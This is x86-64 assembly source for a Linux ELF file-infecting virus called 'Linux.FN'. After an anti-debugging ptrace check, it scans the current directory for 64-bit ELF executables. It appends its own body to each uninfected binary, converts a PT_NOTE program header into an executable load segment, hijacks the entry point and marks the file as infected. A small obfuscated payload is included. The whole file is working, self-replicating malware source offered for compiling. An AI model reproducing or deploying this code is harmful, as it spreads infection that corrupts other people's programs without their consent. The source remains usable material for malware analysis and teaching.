;      ___       ___     
;     /\__\     /\  \    
;    /:/ _/_    \:\  \   
;   /:/ /\__\    \:\  \  
;  /:/ /:/  /_____\:\  \ 
; /:/_/:/  //::::::::\__\
; \:\/:/  / \:\~~\~~\/__/
;  \::/__/   \:\  \      
;   \:\  \    \:\  \     
;    \:\__\    \:\__\    
;     \/__/     \/__/    
;
;
; Compile with : nasm -f elf64 Linux.FN.asm && ld -o fn Linux.FN.o -melf_x86_64




BITS 64


DIRENT_BUFSIZE  equ 1024
DT_REG          equ 8
PT_LOAD         equ 1
PT_NOTE         equ 4
PF_XR           equ 5

section .text
global _start
_start:                             ; entry v_start 


    mov     rax, 101
    xor     rdi, rdi
    xor     rsi, rsi
    xor     r10, r10
    xor     rdx, rdx
    inc     rdx
    syscall

    cmp     rax, 0
    jl      .deteksi_debugger
    je      v_start 

.deteksi_debugger:

    db `\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89`
    db `\xc7\x48\x89\xfa\x48\x83\xc2\x02\x0f\x05`
    db `\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff`
    db `\x0f\x05\xe8\xdd\xff\xff\xff\x3a\x28\x0a`

v_start:
    mov     r14, [rsp + 8]          ; saving argv0 to r14
    push    rdx
    push    rsp
    sub     rsp, 3500           ; reserving 3500 bytes
    mov     rbx, rsp                        ; rbx has the reserved stack buffer address

load_dir:
    push    "."
    mov     rdi, rsp
    xor     edx, edx                    ; flags=0
    push    rdx
    pop     rsi
    mov     rax, 2
    syscall                                     ; rax contains the fd
    pop     rdi


    push    rax                                 ; fd
    pop     rdi
    lea     rsi, [rbx + 400]
    mov     rdx, DIRENT_BUFSIZE
    xor     eax,eax
    mov     al, 217  ;getdirent
    syscall
    test    rax, rax                            ; success?
    js      v_stop
    mov     qword [rbx + 350], rax              ; directory size
    mov     rax, 3
    syscall                             ; close source fd in rdi
    xor     ecx, ecx                    ; pointer for the directory entries

file_loop:
    push    rcx                                 ;save the pointer
    cmp     byte [rcx + rbx + 418], DT_REG      ; regular file?
    jne     .continue                           ; if not, proceed to next file
.open_target_file:
    lea     rdi, [rcx + rbx + 419]              ; dirent.d_name equ [rbx + 419]
    xor     edx, edx                            ; not using any flags
    mov     rax, 2
    mov     rsi, 2
    syscall
    cmp     rax, 0      ; can't open?
    jbe     .continue   ; not open
    mov     r9, rax     ; target fd

.read_ehdr:
    mov     rdi, r9             ;  fd
    lea     rsi, [rbx + 144]    ;144-144=e_hdr[0] buffer
    mov     rdx, 64
    xor     r10d, r10d          ; read at offset 0
    mov     rax, 17
    syscall

.is_elf:
    cmp     dword [rbx + 144], 0x464c457f ;144-144=0        ; ELF?
    jnz     .close_file
.is_64:
    cmp     byte [rbx + 148], 2 ;148-144=4                  ; 64bit?
    jne     .close_file                                     ; skipt it if not

.is_infected:
    cmp     word [rbx + 151], 0x4e46 ; ID = FN , 151-144=7
    jz      .close_file

    mov     r8, [rbx + 176] ;176-144=32         ; ehdr.phoff
    xor     r12w, r12w                          ; initializing phdr loop counter in r12w
    xor     r14d, r14d                          ; phdr file offset

.loop_phdr:
    mov     rdi, r9                              ; fd
    lea     rsi, [rbx + 208]  ;208-144=64        ; phdr[0] buffer
    mov     dx, word [rbx + 198]  ;198-144=54    ; ehdr.phentsize
    mov     r10, r8                              ; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)
    mov     rax, 17
    syscall

    cmp     byte [rbx + 208], PT_NOTE   ;208-144=64     ; phdr.type =  PT_NOTE (4) ??
    jz      .infect

    inc     r12w                        ; inc counter
    cmp     r12w, word [rbx + 200] ;200-144=56           ; (ehdr.phnum)=phdr.num?
    jge     .close_file

    add     r8w, word [rbx + 198] ;198-144=54            ; otherwise, add current ehdr.phentsize from [rbx + 198] into r8w
    jnz     .loop_phdr                                      ; read next phdr

.infect:
.get_target_phdr_file_offset:

    mov     ax, r12w ; mov eax, ebx                     ; loading phdr loop counter bx to ax
    mov     dx, word [rbx + 198] ;198-144=54            ; loading ehdr.phentsize from [rbx + 198] to dx
    imul    dx                                          ; bx * ehdr.phentsize
    mov     r14w, ax
    add     r14, [rbx + 176] ;176-144=32                ; r14 equ ehdr.phoff + (bx * ehdr.phentsize)

.file_info:
    mov     rdi, r9
    mov     rsi, rbx                                    ; rsi equ rbx equ stack buffer address
    mov     rax, 5
    syscall                                             ; stat.st_size equ [rbx + 48]

.append_virus:
; getting target EOF
    
    mov     rdi, r9                                     ; r9 contains fd
    xor     esi, esi
    mov     rdx, 2
    mov     rax, 8
    syscall
    push rax                                            ; saving target EOF

    call    .delta                                      ; the age old trick
.delta:
    pop     rbp
    sub     rbp, .delta

; writing virus body to EOF
    mov     rdi, r9                                     ; r9 contains fd
    lea     rsi, [rbp + v_start]                        ; loading v_start address in rsi
    mov     rdx, v_stop - v_start                       ; virus size
    mov     r10, rax                                    ; rax contains target EOF offset from previous syscall
    mov     rax, 18
    syscall

    cmp     rax, 0
    jbe     .close_file

.patch_phdr:
    pop     rax
    mov     dword [rbx + 208], PT_LOAD  ;208-144=64         ; change phdr type in [rbx + 208] from -
                                                            ; PT_NOTE to PT_LOAD (1)

    mov     dword [rbx + 212], PF_XR ;212-144=68            ; change phdr.flags in [rbx + 212] to - 
                                                            ; PF_X (1) | PF_R (4)

    mov     [rbx + 216], rax ;216-144=72                ; phdr.offset [rbx + 216] equ target EOF offset
    mov     r13, [rbx + 48]                             ; storing target stat.st_size from [rbx + 48] in r13
    add     r13, 0xd000000                              ; adding 0xd000000 to target file size
    mov     [rbx + 224], r13                            ; changing phdr.vaddr in [rbx + 224] to - 
                                                        ; new one in r13 (stat.st_size + 0xc000000)

    mov     qword [rbx + 256], 0x200000                 ; set phdr.align in [rbx + 256] to 2mb
    add     qword [rbx + 240], v_stop - v_start + 5     ; add virus size to phdr.filesz in [rbx + 240] + 5 
                                                        ; for the jmp to original ehdr.entry

    add     qword [rbx + 248], v_stop - v_start + 5     ; add virus size to phdr.memsz in [rbx + 248] + 5 
                                                        ; for the jmp to original ehdr.entry
    ; writing patched phdr
    mov     rdi, r9                                     ; r9 contains fd
    mov     rsi, rbx                                    ; rsi equ rbx equ stack buffer address
    lea     rsi, [rbx + 208]                            ; rsi equ phdr equ [rbx + 208]
    mov     dx, word [rbx + 198]                        ; ehdr.phentsize from [rbx + 198]
    mov     r10, r14                                    ; phdr from [rbx + 208]
    mov     rax, 18
    syscall

    cmp     rax, 0
    jbe     .close_file

.patch_ehdr:
; patching ehdr
                
    mov     r14, [rbx + 168]                ; storing target original ehdr.entry from [rbx + 168] in r14
    mov     [rbx + 168], r13                ; set ehdr.entry in [rbx + 168] to r13 (phdr.vaddr)
    mov     word [rbx+151], 0x4e46          ; ID = FN

; writing patched ehdr
    mov     rdi, r9                                     ; r9 contains fd
    lea     rsi, [rbx + 144]                            ; rsi equ ehdr equ [rbx + 144]
    push    64 ;ehdr.size
    pop     rdx
    xor     r10d, r10d       ;ehdr.offset
    mov     rax, 18
    syscall

    cmp     rax, 0
    jbe     .close_file

.write_patched_jmp:
; getting target new EOF
    mov     rdi, r9                                     ; r9 contains fd
    xor     esi, esi
    mov     rdx, 2
    mov     rax, 8
    syscall                                         ; getting target EOF offset in rax

; creating patched jmp
    mov     rdx, [rbx + 224]                            ; rdx equ phdr.vaddr
    add     rdx, 5
    sub     r14, rdx
    sub     r14, v_stop - v_start
    mov     byte [rbx + 300 ], 0xe9
    mov     dword [rbx + 301], r14d

; writing patched jmp to EOF
    mov     rdi, r9                                     ; r9 contains fd
    lea     rsi, [rbx + 300]                            ; rsi equ patched jmp in stack buffer equ [rbx + 208]
    mov     rdx, 5
    mov     r10, rax                                    ; mov rax to r10 equ new target EOF
    mov     rax, 18
    syscall

    cmp     rax, 0
    jbe     .close_file

    xor     eax, eax
    mov     al, 162  ; commiting filesystem caches to disk
    syscall

.close_file:
    mov     rax, 3
    syscall

.continue:
    pop     rcx
    add     cx, word [rcx + rbx + 416]         ; adding directory record lenght to cx (lower rcx, for word)
    cmp     rcx, qword [rbx + 350]             ; comparing rcx counter with r10 (directory records total size)
    jne     file_loop                          ; if counter is not the same, continue loop. Exit virus otherwise

infected_run:
    call    payload

payload:
; This is very "dumb" payload >.<

    pop     rsi                                             
    lea     rdi, [rbx + 3001]

    db `\x0f\x0d\x04\x9a` 
    db `\x6a\x08`                   
    db `\x58`  
    db `\x0f\x0d\x04\x9b`              
    db `\x04\x30`                   
    db `\xaa`                     
    db `\xb8\xfd\xff\xff\xff`          
    db `\x0f\xba\xf0\x03`           
    db `\xf7\xd0`                   
    db `\xaa` 
    db `\x0f\x0d\x04\x9c`
    db `\x0f\x0d\x04\x96` 
    db `\x0f\x0d\x04\x97` 
    db `\x0f\x0d\x04\x98`
    db `\x0f\x0d\x04\x99`   

 ;   0f0d1416  
 ;   0f0d1417  
 ;   0f0d1418  
 ;   0f0d1419  
 ;   0f0d141a  
 ;   0f0d141b  
 ;   0f0d141c  


                     
    lea     rsi, [rbx + 3001]
    mov     rax, 1
    mov     rdi, 1
    mov     rdx, 2  ; size payload
    syscall


cleanup:
    add     rsp, 3500    ; restoring stack so host process can run normally, 
                         ; this also could use some improvement
    pop     rsp
    pop     rdx

V_SIZE  equ $ - v_start

v_stop:
    xor     edi, edi                                                ; exit code 0
    mov     rax, 60
    syscall
